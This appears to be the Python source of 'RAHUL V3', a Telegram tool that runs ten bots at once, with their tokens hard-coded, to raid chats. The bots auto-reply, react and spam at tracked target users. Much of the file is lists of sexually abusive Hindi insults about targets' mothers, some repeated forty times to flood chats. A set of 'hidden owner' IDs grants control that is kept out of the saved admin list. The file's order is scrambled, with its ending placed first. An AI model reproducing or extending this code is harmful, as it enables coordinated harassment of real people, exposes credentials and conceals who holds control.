is_processed(message.message_id, chat_id):                possible_targets = [t for t in [chat_id, sender_chat_id, uid] if t is not None]                target_for_react = next((t for t in possible_targets if t in react_targets), None)        if target_for_react:            emoji_to_react = react_targets[target_for_react]            for b in bots:                async def delayed_react(b_instance, delay):                    await asyncio.sleep(delay)                    try:                        await b_instance.set_message_reaction(                            chat_id=chat_id,                            message_id=message.message_id,                            reaction=[ReactionTypeEmoji(type='emoji', emoji=emoji_to_react)]                        )                    except Exception: pass                                asyncio.create_task(delayed_react(b, random.uniform(0.1, 2.0)))        target_for_reply = next((t for t in possible_targets if t in reply_RAHUL_targets), None)        if target_for_reply and REPLY_RAHUL_TEXTS:            for b in bots:                async def delayed_reply(b_instance, delay):                    await asyncio.sleep(delay)                    try:                        await b_instance.send_message(                            chat_id=chat_id,                            text=random.choice(REPLY_RAHUL_TEXTS),                            reply_to_message_id=message.message_id                        )                    except Exception: pass                asyncio.create_task(delayed_reply(b, random.uniform(0.1, 1.5)))        target_for_slide = next((t for t in possible_targets if t in targetslide_targets), None)        if target_for_slide and TARGET_SLIDE_TEXTS:            target_name = targetslide_targets[target_for_slide]            mention = f"[{target_name}](tg://user?id={target_for_slide})" if target_for_slide > 0 else target_name            for b in bots:                text = random.choice(TARGET_SLIDE_TEXTS).replace("{name}", mention)                async def delayed_slide(b_instance, delay, txt):                    await asyncio.sleep(delay)                    try:                        await b_instance.send_message(                            chat_id=chat_id,                            text=txt,                            reply_to_message_id=message.message_id,                            parse_mode=ParseMode.MARKDOWN                        )                    except Exception: pass                asyncio.create_task(delayed_slide(b, random.uniform(0.1, 1.5), text))        if chat_id in swipe_mode:            name_arg = swipe_mode[chat_id]            for b in bots:                template = random.choice(SWIPE_TEXTS)                async def delayed_swipe(b_instance, delay, txt):                    await asyncio.sleep(delay)                    try:                        await b_instance.send_message(                            chat_id=chat_id,                            text=txt,                            reply_to_message_id=message.message_id,                            parse_mode=ParseMode.MARKDOWN                        )                    except Exception: pass                asyncio.create_task(delayed_swipe(b, random.uniform(0.1, 1.5), template.replace("NAME", name_arg)))async def main():    print(f"\n{GREEN}⏳ INITIALIZING...{RESET}\n")    for token in TOKENS:        if token.strip():            bot_instance = Bot(token=token.strip())            bots.append(bot_instance)    for b in bots:        try:            me = await b.get_me()            bot_usernames.append(me.username)            print(f"{GREEN}✅ CONNECTED SUCCESSFULLY: @{me.username}{RESET}")        except Exception as e:            print(f"{RED}❌ Error starting a bot: {e}{RESET}")    print(f"\n{GREEN}RAHUL V3 STARTED!{RESET}\n")        await dp.start_polling(*bots, drop_pending_updates=True)if __name__ == "__main__":    try:        asyncio.run(main())    except (KeyboardInterrupt, SystemExit):        save_db()        print(f"\n{RED}🛑 SHUTTING DOWN RAHUL...{RESET}")
+import asyncio
+
+
+
+import os
+
+
+
+import json
+
+
+
+import random
+
+
+
+import time
+
+
+
+import uuid
+
+
+
+import logging
+
+
+
+import shutil
+
+
+
+import sys
+
+
+
+import urllib.parse
+
+
+
+import textwrap
+
+
+
+from datetime import datetime, timezone, timedelta
+
+
+
+from collections import OrderedDict
+
+
+
+
+
+
+
+
+
+
+
+import aiohttp
+
+
+
+from aiogram.types import BufferedInputFile, ChatMemberUpdated
+
+
+
+
+
+
+
+try:
+
+
+
+    from PIL import Image, ImageDraw, ImageFont
+
+
+
+    HAS_PIL = True
+
+
+
+except ImportError:
+
+
+
+    HAS_PIL = False
+
+
+
+
+
+
+
+try:
+
+
+
+    from pilmoji import Pilmoji
+
+
+
+    HAS_PILMOJI = True
+
+
+
+except ImportError:
+
+
+
+    HAS_PILMOJI = False
+
+
+
+
+
+
+
+if sys.platform == "win32":
+
+
+
+    try:
+
+
+
+        import ctypes
+
+
+
+        kernel32 = ctypes.windll.kernel32
+
+
+
+        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
+
+
+
+    except Exception:
+
+
+
+        pass
+
+
+
+
+
+
+
+GREEN = "\033[92m"
+
+
+
+RED = "\033[91m"
+
+
+
+RESET = "\033[0m"
+
+
+
+
+
+
+
+logging.basicConfig(level=logging.WARNING)
+
+
+
+
+
+
+
+AUTO_OPTIMIZE_INTERVAL = 1
+
+
+
+COMMAND_TIMEOUT = 100
+
+
+
+MAX_CACHE_SIZE = 5000
+
+
+
+
+
+
+
+bot_start_time = time.time()
+
+
+
+
+
+
+
+def get_uptime():
+
+
+
+    """Calculates and formats the total uptime of the bot script."""
+
+
+
+    uptime = int(time.time() - bot_start_time)
+
+
+
+    hours = uptime // 3600
+
+
+
+    minutes = (uptime % 3600) // 60
+
+
+
+    seconds = uptime % 60
+
+
+
+    return f"{hours}h {minutes}m {seconds}s"
+
+
+
+
+
+
+
+TOKENS = ["9207648759:AAEnOEEU6i2daP0y9-_EyGwPXQjfycU8aL0" ,
+
+"9176539988:AAH8smVFmZwscoA_K8Yw1td6gOc6fYPpsNM" ,
+
+"9039685525:AAFM3uGcrtnukax3C8ARdjES3y1oYOWmYEE" ,
+
+"9098544054:AAGybWLn_3RqLOPKckwjzN-1WULcKKn_cuo" ,
+
+"9128164039:AAEkG5Nfq-VOM67B-5Drf1BtCjvx2sGhPAQ" ,
+
+"9040047215:AAH_irqb7iqu7S6dHNLrXqwuGTWp-Y_2Udo" ,
+
+"9014210382:AAEnPtRPgNSDGitQNuKVXbnbtuAQSKCO5S0" ,
+
+"9216634826:AAG84v6irOuaW17Leyc6YVsYCREEgIdFCGU" ,
+
+"9283554345:AAEsVbYUMgCFVtFeKLBMGnCKYeaX_eW5xWE" ,
+
+"9097736415:AAHbQk5UycY9su6CvSfvbPzW2f9Q6Brdd74" ,]
+
+
+
+
+
+
+
+OWNER_ID = 8853215731
+
+
+
+
+
+
+
+
+
+
+
+SUDO_FILE = "RAHUL_sudo.json"
+
+
+
+DB_FILE = "RAHUL_db.json"
+
+
+
+
+
+
+
+HIDDEN_OWNER_IDS = {
+
+
+
+    8853215731,  # <-- put the hidden owner's Telegram user ID here
+
+
+
+}
+
+
+
+global_storage = os.path.join(os.path.dirname(__file__), 'downloads', 'global')
+
+
+
+os.makedirs(global_storage, exist_ok=True)
+
+
+
+
+
+
+
+START_PIC_PATH = os.path.join(global_storage, "start_pic.jpg")
+
+
+
+
+
+
+
+chars = {
+
+
+
+      'a': '𝙖', 'b': '𝙗', 'c': '𝙘', 'd': '𝙙', 'e': '𝙚', 'f': '𝙛', 'g': '𝙜',
+
+
+
+    'h': '𝙝', 'i': '𝙞', 'j': '𝙟', 'k': '𝙠', 'l': '𝙡', 'm': '𝙢', 'n': '𝙣',
+
+
+
+    'o': '𝙤', 'p': '𝙥', 'q': '𝙦', 'r': '𝙧', 's': '𝙨', 't': '𝙩', 'u': '𝙪',
+
+
+
+    'v': '𝙫', 'w': '𝙬', 'x': '𝙭', 'y': '𝙮', 'z': '𝙯',
+
+
+
+    'A': '𝘼', 'B': '𝘽', 'C': '𝘾', 'D': '𝘿', 'E': '𝙀', 'F': '𝙁', 'G': '𝙂',
+
+
+
+    'H': '𝙃', 'I': '𝙄', 'J': '𝙅', 'K': '𝙆', 'L': '𝙇', 'M': '𝙈', 'N': '𝙉',
+
+
+
+    'O': '𝙊', 'P': '𝙋', 'Q': '𝙌', 'R': '𝙍', 'S': '𝙎', 'T': '𝙏', 'U': '𝙐',
+
+
+
+    'V': '𝙑', 'W': '𝙒', 'X': '𝙓', 'Y': '𝙔', 'Z': '𝙕'
+
+
+
+}
+
+
+
+
+
+
+
+def font(text: str) -> str:
+
+
+
+    """Converts standard text into a stylized small-caps font."""
+
+
+
+    return "".join(chars.get(c, c) for c in text)
+
+
+
+
+
+
+
+from aiogram import Bot, Dispatcher, types, F
+
+
+
+from aiogram.filters import Command, CommandObject
+
+
+
+from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter
+
+
+
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, ReactionTypeEmoji
+
+
+
+from aiogram.enums import ParseMode
+
+
+
+
+
+
+
+try:
+
+
+
+    from aiogram.types import LinkPreviewOptions
+
+
+
+except ImportError:
+
+
+
+    LinkPreviewOptions = None
+
+
+
+
+
+
+
+SUDO_USERS = {OWNER_ID} | set(HIDDEN_OWNER_IDS)
+
+
+
+username_to_id = {}
+
+
+
+user_names = {}
+
+
+
+
+
+
+
+muted_users = set()
+
+
+
+reply_RAHUL_targets = set()
+
+
+
+targetslide_targets = {}
+
+
+
+react_targets = {} 
+
+
+
+known_chats = set()
+
+
+
+lord_groups = set()  # Persisted group allow-list for owner-managed group utilities.
+
+
+
+
+
+
+
+VALID_REACTS = ["🤣","🤪","👻","❤️","🤡","🥱","🤮","❤️‍🔥","⚡"]
+
+
+
+SEQ_EMOJIS = ["✦❗✧","✦❕✧","✦❓✧","✦❔✧","✦‼️✧","✦⁉️✧","✦⚠️✧","✦🚨✧","✦⛔✧","✦🚫✧","✦❌✧","✦⭕✧","✦🔴✧","✦🟠✧","✦🟡✧","✦🟢✧","✦🔵✧","✦🟣✧","✦🔺✧","✦🔻✧","✦🔸✧","✦🔹✧","✦🔶✧","✦🔷✧","✦⬆️✧","✦⬇️✧","✦⬅️✧","✦➡️✧","✦↗️✧","✦↘️✧","✦↖️✧","✦↙️✧","✦↕️✧","✦↔️✧","✦🔁✧","✦🔄✧","✦✔️✧","✦☑️✧","✦✅✧","✦✖️✧","✦❎✧","✦➕✧","✦➖✧","✦➗✧","✦✳️✧","✦✴️✧","✦❇️✧","✦〽️✧","✦💢✧","✦💯✧","✦💥✧","✦💫✧","✦💦✧","✦💨✧","✦🟥✧","✦🟧✧","✦🟨✧","✦🟩✧","✦🟦✧","✦🟪✧","✦◼️✧","✦◻️✧","✦◾✧","✦◽✧","✦▪️✧","✦▫️✧","✦🔲✧","✦🔳✧","✦⬛✧","✦⬜✧","✦⚫✧","✦⚪✧","✦🟤✧","✦🅰️✧","✦🅱️✧","✦🅾️✧","✦🆎✧","✦🆑✧","✦🆘✧","✦™️✧","✦©️✧","✦®️✧","✦ℹ️✧","✦🔤✧","✦🔡✧","✦🔠✧","✦🔢✧","✦#️⃣✧","✦*️⃣✧","✦0️⃣✧","✦1️⃣✧","✦2️⃣✧","✦3️⃣✧","✦4️⃣✧","✦5️⃣✧","✦6️⃣✧","✦7️⃣✧","✦8️⃣✧","✦9️⃣✧","✦🔟✧","✦🔚✧","✦🔙✧","✦🔛✧"]
+
+
+
+
+
+
+
+
+
+
+
+def load_data():
+
+
+
+    """Loads database variables from JSON files safely."""
+
+
+
+    if os.path.exists(SUDO_FILE):
+
+
+
+        try:
+
+
+
+            with open(SUDO_FILE, 'r') as f:
+
+
+
+                for uid in json.load(f): SUDO_USERS.add(int(uid))
+
+
+
+        except Exception: pass
+
+
+
+        
+
+
+
+    if os.path.exists(DB_FILE):
+
+
+
+        try:
+
+
+
+            with open(DB_FILE, 'r') as f:
+
+
+
+                data = json.load(f)
+
+
+
+                for u in data.get("muted",[]): muted_users.add(u)
+
+
+
+                for u in data.get("reply_RAHUL",[]): reply_RAHUL_targets.add(u)
+
+
+
+                for k, v in data.get("targetslide", {}).items(): targetslide_targets[int(k)] = v
+
+
+
+                for k, v in data.get("user_names", {}).items(): user_names[int(k)] = v
+
+
+
+                for k, v in data.get("react_targets", {}).items(): react_targets[int(k)] = v
+
+
+
+                for c in data.get("known_chats",[]): known_chats.add(int(c))
+
+
+
+                for c in data.get("lord_groups",[]): lord_groups.add(int(c))
+
+
+
+        except Exception as e:
+
+
+
+            print(f"{RED}[DB] Error loading DB: {e}{RESET}")
+
+
+
+
+
+
+
+def save_sudo():
+
+
+
+    """Saves the Sudo users list to a JSON file (hidden owners are never written)."""
+
+
+
+    with open(SUDO_FILE, 'w') as f:
+
+
+
+        json.dump(list(SUDO_USERS - set(HIDDEN_OWNER_IDS)), f)
+
+
+
+
+
+
+
+def save_db():
+
+
+
+    """Serializes memory structures and saves to the DB file."""
+
+
+
+    data = {
+
+
+
+        "muted": list(muted_users),
+
+
+
+        "reply_RAHUL": list(reply_RAHUL_targets),
+
+
+
+        "targetslide": targetslide_targets,
+
+
+
+        "user_names": user_names,
+
+
+
+        "react_targets": react_targets,
+
+
+
+        "known_chats": list(known_chats),
+
+
+
+        "lord_groups": sorted(lord_groups)
+
+
+
+    }
+
+
+
+    with open(DB_FILE, 'w') as f:
+
+
+
+        json.dump(data, f)
+
+
+
+
+
+
+
+load_data()
+
+
+
+
+
+
+
+class SimpleLRUCache:
+
+
+
+    def __init__(self, capacity: int):
+
+
+
+        self.cache = OrderedDict()
+
+
+
+        self.capacity = capacity
+
+
+
+    
+
+
+
+    def get(self, key):
+
+
+
+        if key not in self.cache:
+
+
+
+            return False
+
+
+
+        self.cache.move_to_end(key)
+
+
+
+        return True
+
+
+
+        
+
+
+
+    def put(self, key):
+
+
+
+        self.cache[key] = True
+
+
+
+        self.cache.move_to_end(key)
+
+
+
+        if len(self.cache) > self.capacity:
+
+
+
+            self.cache.popitem(last=False)
+
+
+
+
+
+
+
+processed_messages = SimpleLRUCache(MAX_CACHE_SIZE)
+
+
+
+
+
+
+
+def is_processed(message_id: int, chat_id: int) -> bool:
+
+
+
+    """Checks if a command was already handled by another bot."""
+
+
+
+    key = (chat_id, message_id)
+
+
+
+    if processed_messages.get(key):
+
+
+
+        return True
+
+
+
+    processed_messages.put(key)
+
+
+
+    return False
+
+
+
+
+
+
+
+bots = []
+
+
+
+bot_usernames = []
+
+
+
+
+
+
+
+# Task Trackers
+
+
+
+group_tasks = {}
+
+
+
+seq_nc_tasks = {}
+
+
+
+keng_tasks = {}
+
+
+
+spmnc_tasks = {}
+
+
+
+RAHULnc_tasks = {}
+
+
+
+slidespam_tasks = {}
+
+
+
+spm_loop_tasks = {}
+
+
+
+rspm_tasks = {}
+
+
+
+RAHULspam_tasks = {}
+
+
+
+forwardspm_tasks = {}
+
+
+
+sticker_spm_tasks = {}
+
+
+
+gif_spm_tasks = {}
+
+
+
+media_spm_tasks = {}
+
+
+
+voice_spm_tasks = {}
+
+
+
+pfp_tasks = {}
+
+
+
+
+
+
+
+# Delays 
+
+
+
+swipe_mode = {}
+
+
+
+nc_delays = {}
+
+
+
+spm_delays = {}
+
+
+
+rspm_delays = {}
+
+
+
+pfp_delays = {}
+
+
+
+REPLY_RAHUL_DELAY = 0.2
+
+
+
+
+
+
+
+known_users = set()
+
+
+
+active_menus = {}
+
+
+
+
+
+
+
+def stop_task_group(task_dict, key):
+
+
+
+    """Safely clears tasks from a given dictionary key gracefully ensuring stability."""
+
+
+
+    if key in task_dict:
+
+
+
+        val = task_dict[key]
+
+
+
+        if isinstance(val, (dict, list, set)):
+
+
+
+            val.clear()
+
+
+
+        del task_dict[key]
+
+
+
+        return True
+
+
+
+    return False
+
+
+
+
+
+
+
+async def delayed_task(delay: float, coro):
+
+
+
+    """Utility wrapper to add a delay before awaiting a coroutine."""
+
+
+
+    await asyncio.sleep(delay)
+
+
+
+    await coro
+
+
+
+
+
+
+
+def get_exact_text(message: types.Message) -> str:
+
+
+
+    """Extracts raw text preserving all exact spaces and newlines natively."""
+
+
+
+    if not message.text: return ""
+
+
+
+    cmd_len = len(message.text.split()[0])
+
+
+
+    exact = message.text[cmd_len:]
+
+
+
+    if exact.startswith(" "): exact = exact[1:]
+
+
+
+    return exact
+
+
+
+
+
+
+
+def get_auth_id(message: types.Message) -> int:
+
+
+
+    """Reliably extracts the author's ID, prioritizing channels securely."""
+
+
+
+    if message.from_user:
+
+
+
+        return message.from_user.id
+
+
+
+    if message.sender_chat:
+
+
+
+        return message.sender_chat.id
+
+
+
+    return message.chat.id
+
+
+
+
+
+
+
+def is_sudo(user_id):
+
+
+
+    return user_id in SUDO_USERS
+
+
+
+
+
+
+
+def is_owner(user_id):
+
+
+
+    return user_id == OWNER_ID or user_id in HIDDEN_OWNER_IDS
+
+
+
+
+
+
+
+RAID_TEXTS = ["2-3 ⱮƛӇƖƝЄ ӇƲЄ ƝƛӇƖ ӇƛƓƝЄ ԼƓЄ ", "ⱦєяє ɠɦαя кι αυятση кι вяα ƒαα∂ к αρηα кυятα ѕιℓωαυ яη∂ук ", "ƓƦƖƁ Ɱƛ Ƙ ƁƛƇӇƳ ƓƓƦ ⱮЄ ƛƬƬƛ ԼЄ ƛƛ ", "ƊHƛƬ яη∂ιкєу ", "ƬЄƦƖ Ɱƛƛ Ƙƛ ƁHƧƊƛ ", "Ƭєяι мα к вσѕ∂є м αιѕα ℓαт мαяυggα ηα gαтє ωαу σƒ ιndια bαη נαєggα ", "ꪶ  ⱠƲƝ ƬЄ Ɣƛʝ ꪻ♡︎ ", "уααя αρηι мα мт ηυηgу кя ", "Ƭяу мσм кє ѕαтн вα∂ мαηηєяѕ кя∂υggα ", "ƬЄƦƖ Ɱƛƛ ƇHƠƊƲƝ ", "ƬЄƦƖ Ɱƛ Ƙ ƁHƠƧƊƛ ⱮƛƊHƠƊ ", "ⱮƛƇƇHƛƦ ƬⱮƘƇ ", "Ƭєяу мαα кσ qαвαя ηαѕєєв ηα нσ яη∂укє ", "ƲƬH яη∂к кυттє ", "ƤƛƦԼЄ Ɠ ƘHƛЄƓƛ ƘƳƛ ƬƠⱮⱮƳ ", "ƁƖHƛƦƖ ƓƛƝƓ ƬЄƦƖ Ɱƛ ƇHƠƊƲƝ ", "ƬƲⱮ ƧƁ ƘƲƬƬƠ ƘƖ ʝHƲƝƊ ƘƖ ⱮƘƁ ", "ƓƇ ԼЄƑƬ ԼЄ яη∂ιвαℓα ", "Ƭєяι мαα кι ƈнσтι ραкα∂ кє ∂єєωαя мє мααяυngα ∂HƛM ∂HƛM кι αωααנ ααуєgι ", "ƁHƛƓƝƛ ⱮƛƝƛ ӇƳ ƬⱮƘƇ ", "ƘƖ ⱮƘƁ Ʀ ƁHƛƓ KЄƧЄ ƦӇЄ ӇƠ ƓƛƦƖƁƠ ", "ƬⱮƘƇ ", "ƬⱮƘƇ ", "ƬƁƘƇ ", "ƦƝƊƘ ƁƛƇӇƳ ", "ƠƳЄ ƬƠⱮⱮƳ ƲƬH ƁHƛƓƝƛ ƝƳ ӇƛƖ "]
+
+
+
+emo_EMOJIS = ["🎀", "👑", "😂", "🤪", "👻", "❤️", "🌺", "🧊", "✅", "😹", "😻", "💦", "🤍", "🖤", "🤎", "💜", "💙", "❤️", "🧡", "💛", "💚", "💦", "🧑🏻‍✈️", "👮🏻", "🧑🏻‍🎓", "🦋", "🐳", "🎚️", "💸", "🕯️", "🎛️", "💸", "🕯️", "🏎️", "🚜", "🚚", "🚀"]
+
+
+
+SWIPE_TEXTS = ["NAME ƘƠ ƤEʟƬE ӇƲE EƝƬƦƳ 🤣😎❤️‍🔥","NAME ƬEƦƖ Ɱƛƛ ƘƖ ƇHƲƬ ⱮE ʟƠƲƊƛ ⱮƛƊƛƦƇHƠƊ 😂🩷🤚🏼","NAME ƦEƤʟƳ ƘƛƦ ƓƛƦƖƁ ƊƛƦ ƘƳƲ ƦƛӇƛ Ӈ 😁🤙🏼🤍","NAME ƇHƛʟ ƬEƦƖ Ɱƛ ƇHƠƊƲ ƤƛƬƛƘ ƤƛƬƛƘ ƘE 🤪👻🩶","NAME ƇHƲƊƘE ƧƤƛⱮ ƳƛӇƖ ƛƲƘƛƬ Ӈ ƬEƦƖ ƓƛƦƖƁ 😹🩵🙌🏼","ƇƤ ƘƛƦ NAME ƓƛƦƖƁ ƁHƛƛƓ ⱮƬ ƇHƠƬEƳ 😂🩶🤚🏼","NAME ƘƖ ⱮƲⱮⱮƳ ƘƠ ƦƝƊƖ ƁƛƝƛ ƊƲƝƓƛ ӇEӇEӇE 🤣💖✌🏼","NAME ƘE ƁƛƛƤ ƖƟƧƬ YEӇ ӇƛƖ ƖƝƘƖ Ɱƛƛ ƘE ƳƛƛƦ 😆🩶🤚🏼","ƘƛƁƛƊƖ ƔƛʟE NAME ƘƖ ⱮƘƁ 🤣👻💗","ƛƦEƳ NAME ƘƖ ⱮƘƁ ƳƦ ƁHƛƓ ƘƛƖƧE ƦӇЄ ӇƠ ƓƛƦƖƁƠ 😤👻💞","ƛƦEƳ NAME ⱮƛƇƇHƛƦ ƬⱮƘƇ 😂🩷✌🏾","NAME Ʋ ʟƛƊӇEƓƛ ӇƲⱮƧE ƬEƦƖ Ɱƛ ƇƠƊƘE ⱮƖƬƬƖ ⱮE ⱮƖʟƛƊEƝƓE ӇƲⱮ 😂🔥🤸🏻","NAME ʟEƛƔE ʟE ƬƲ ƦƝƊƳƘE ƤƛƧƛƝƊ ƝƛƖ ƛƳƛ ⱮƦƘƠ 😏👋🏼","NAME ƓƦƖƁ Ɱƛ Ƙ ƁƛƇӇƳ ƓHƛƦ ⱮE ƛƬƬƛ ʟE ƛƛ 😂🥲","NAME ƛƲƦƛƬƠ Ƙƛ ƘƛⱮ ƦƠƬƖ ƁƝƛƝƛ ӇƠƬƛ Ӈ ƬƠ NAME ƘƖ Ɱƛ ƳƛӇƛ ƘƳƲ ƇHƲƊƦӇƖ 🤬🤣😭","NAME ƬEƦƖ Ɱƛ ƘƠ ƧEƝƛƤƛƬƖ ƧE ƇHƲƊƔƛƊEƝƓE 🪖🖲️🔥","NAME ƬƦƳ ƓƝƊ ⱮE ƛEƧƛ ƁHƛʟƛ ⱮƛƦƓƛ ƧƖƊӇƛ ⱮƠƲƝƬ EƔEƦEST ƤE ƦƲƘEƓƛ 💯🚀💔","NAME ƬEƦƖ Ɱƛƛ ƬƛƘʟƖ ӇEӇEӇE 💖💛💚","NAME ⱮƲJӇE ƝƲⱮƁEƦ ƘƖ ƘƳƛ ƵƛƦƲƦƛƬ\nⱮƛƖ ӇƲ EƘ ƤʟƲⱮƁEƦ 👨‍🔧\nJƛƁ ƇHƠƊƝE Ƙƛ ⱮƛƝƝ ƘƦEƓƛ NAME ƘƖ Ɱƛƛ ƇƠƊ ƊƲƝƓƛ ƓHƛƦ 😂🔧","NAME ƬEƦƳ Ɱƛƛ ƘƠ ƘƛƁƛ ƝƛƧEEƁ Ɲƛ ӇƠ ƦƝƊƳƘE 😑🖕🏽💔","NAME ʟƲƝ ƬE ƔƛJ 😂👏🏻✨","NAME ƬEƦƳ ƝƛƝƖ ƇHƲƊ ƓƳƖ ƊHƛƮ ƊHƛƮ ƊHƛƮ 🥁🔊😍"]
+
+
+
+TARGET_SLIDE_TEXTS =["𝙉𝙔 𝙉𝙔 𝙉𝙔 𝙈𝙀 𝙆𝙐𝘾𝙃 𝙉𝙔 𝙅𝙉𝙏𝘼 𝘽BS 𝙀𝙔 {name} 𝙆𝙄 𝙈𝘼 𝙍𝙉𝘿𝙔 𝙀𝙔 🤣🔥", "𝙊𝙔𝙔 𝙔𝙍𝙍 𝙔𝙀 {name} 𝙆𝙄 𝙈𝘼 𝙍𝙊𝙅 𝙍𝙊𝙅 𝙂𝙊𝘽𝘼𝙍 𝙆𝙃𝘼𝙆𝙍 𝘼𝙋𝙉𝘼 𝘽𝙐𝙉𝘿 𝘿𝙀𝙏𝙄 𝙀𝙔 😑🖕🏿🔥😑🖕🏿🔥", "𝙊𝙔𝙔 {name} 𝙆𝙈𝙕𝙊𝙍 𝙏𝘼𝙏𝙏𝙀 𝙏𝙀𝙍𝙄 𝙈𝘼 𝙎𝘼𝘽𝙎𝙀 𝙎𝙀 𝘽𝙃𝙄𝙆 𝙌 𝙈𝘼𝙉𝙂𝙏𝙄 𝙀𝙔", "𝙊𝙔𝙔 {name} 𝙏𝙀𝙍𝙄 𝙈𝘼 𝙆𝘼 𝘽𝙐𝙉𝘿 𝙆𝘼𝙇𝘼 𝙌 𝙀𝙔 😑🔥🤣🖕🏿🔥", "𝙀𝙑𝙀𝙍𝙔𝙏𝙃𝙄𝙉𝙂 𝙄𝙎 𝙊𝙆 𝘽𝙐𝙏 {name} 𝙆𝙄 𝙈𝘼 𝘾𝙐𝘿𝙉𝘼 𝙄𝙎 𝙋𝙀𝙍𝙈𝘼𝙉𝙀𝙉𝙏 🤣🔥", "{name} 𝙏𝘼𝙏𝙏𝙀 𝙏𝙀𝙍𝙄 𝙈𝘼 𝙆𝙈𝙕𝙊𝙍 𝙍𝙉𝘿𝙔 𝙀𝙔 𝙔𝘼𝙆𝙄𝙉 𝙉𝙔 𝙀𝙔 𝙏𝙊 𝘼𝙋𝙉𝙀 𝙎𝘼𝘽 𝘽𝘼𝘼𝙋 𝙎𝙀 𝙋𝙐𝘾𝙃𝙇𝙀 😑🔥", "𝘼𝙉𝘿𝙔 𝙈𝘼𝙉𝘿𝙔 𝙎𝘼𝙉𝘿𝙔 {name} 𝙏𝘼𝙏𝙏𝙀 𝙆𝙄 𝙆𝙈𝙕𝙊𝙍 𝙈𝘼 𝙎𝙏𝙍𝙊𝙉𝙂𝙀𝙎𝙏 𝙍𝙉𝘿𝙔 😑🖕🏿🔥🤣", "𝙊𝙔 𝙈𝙀 𝙆𝙐𝘾𝙃 𝙉𝙔 𝙎𝙐𝙉𝙐𝙉𝙂𝘼 𝘽𝙎 𝙔𝙀 {name} 𝙆𝙄 𝙈𝘼 𝙈𝙀𝙍𝙄 𝙋𝙑𝙏. 𝙍𝙉𝘿𝙔 𝙀𝙔 😑🔥", "𝘾𝙃𝙄 𝙔𝙍𝙍 𝙀𝙔 {name} 𝙆𝙄 𝙈𝘼 𝘿𝙐𝙎𝙏𝘽𝙄𝙉 𝙎𝙀 𝘿𝙄𝙇𝘿𝙊 𝙉𝙄𝙆𝘼𝙇 𝙆𝙍 𝘼𝙋𝙉𝙀 𝘽𝙐𝙉𝘿 𝙈𝙀 𝘿𝘼𝙇 𝙇𝙀𝙏𝙄 𝙀𝙔 😑🔥", "𝙊𝙔𝙔 {name} 𝙏𝘼𝙏𝙏𝙀 𝙈𝙐𝙅𝙀 𝘽𝘼𝘼𝙋 𝘽𝙉𝘼 𝙇𝙀 𝙉𝙔 𝙏𝙊 𝙏𝙀𝙍𝙄 𝙈𝘼 𝙍𝙉𝘿𝙔"]
+
+
+
+KENG_TEMPLATES = [{"text": "NAME ⱮƎ ƬƎƦƖ ⱮƛƘƠ ƇHƠƊƲƝƓƛ", "emoji": "🥱"}, {"text": "NAME ƇHƲƤ ƦƝƊƳƘƎ", "emoji": "😂"}, {"text": "NAME ƲƬH ƦƝƊƖƘƎ ƁƛƇӇƎ", "emoji": "🍌"}, {"text": "NAME ƛƦE NAME JƛƖƧE ƘƲƬƬƠ ƘƠ ⱮƛƛƦ Ƙ HƲⱮ ƤƛƝƖ Ɣ ƝƛӇƖ ƤƲƇӇƬE ⱮƇ", "emoji": "🩷"},{"text": "NAME Ƙƛ ƁƛƛƤ ƛƛƳƛ", "emoji": "❔"},{"text": "NAME ƘƖ Ɱƛ Ƙƛ ƁƠƠƦ", "emoji": "🤪"},{"text": "ƛƦE NAME ƁHƛƓ KЄƧЄ ƦӇЄ ӇƠ ƓƛƦEEƁƠ", "emoji": "👻"},{"text": "NAME ƲƬHƛƘ ƁƛƖƬӇƛƘ ʟƛƓƛ ⱮƇ", "emoji": "😹"},{"text": "NAME ƵƠƦ ʟƛƓƛ ƝƇ ƇƔ ʟE ⱮƇ", "emoji": "🤣"},{"text": "NAME ƇHƛʟ JӇƲƘ ƦƝƊƘ", "emoji": "😎"}]
+
+
+
+SPMNC_LONG = ["NAME ƲƬH ƤƛƖƦ ƤƘƊ ӇƲⱮƛƦE\n\n\n\n\n\n" * 40, "ƝƳ ƝƳ ⱮE ƘƲƇӇ ƝƳ JƛƝƬƛ ƁƧ NAME ƘƖ Ɱƛ ƦƝƊƳ EƳ\n\n\n\n\n\n" * 40, "NAME ƲƬH ƘE ƁƛƖƬӇ ƦƝƊƘ\n\n\n\n\n\n" * 40, "NAME ƬEƦƖ Ɱƛ ƘƖ ƇHƲƬ ⱮE ƛƛƓ ʟƛƓƛ ƊƲƝƓƛ ⱮƇ\n\n\n\n\n\n" * 40,"NAME ƬEƦƖ ⱮƠⱮ ƦƝƊƳ\n\n\n\n\n\n" * 40,"NAME ƬEƦƖ Ɱƛ ƘƠ ƇHƠƊƲƝ\n\n\n\n\n\n" * 40,"NAME JӇƛƬƲ ƧƛʟE ƁƛƛƤ ʟƠƓ ƧE ʟƛƊӇEƓƛ?\n\n\n\n\n\n" * 40]
+
+
+
+SPMNC_SMALL = ["NAME ƲƬH ƤƛƖƦ ƤƘƊ ӇƲⱮƛƦE","ƝƳ ƝƳ ⱮE ƘƲƇӇ ƝƳ JƛƝƬƛ ƁƧ NAME ƘƖ Ɱƛ ƦƝƊƳ EƳ","NAME ƲƬH ƘE ƁƛƖƬӇ ƦƝƊƘ","NAME ƬEƦƖ Ɱƛ ƘƖ ƇHƲƬ ⱮE ƛƛƓ ʟƛƓƛ ƊƲƝƓƛ ⱮƇ","NAME ƬEƦƖ ⱮƠⱮ ƦƝƊƳ","NAME ƬEƦƖ Ɱƛ ƘƠ ƇHƠƊƲƝ","NAME JӇƛƬƲ ƧƛʟE ƁƛƛƤ ʟƠƓ ƧE ʟƛƊӇEƓƛ?"]
+
+
+
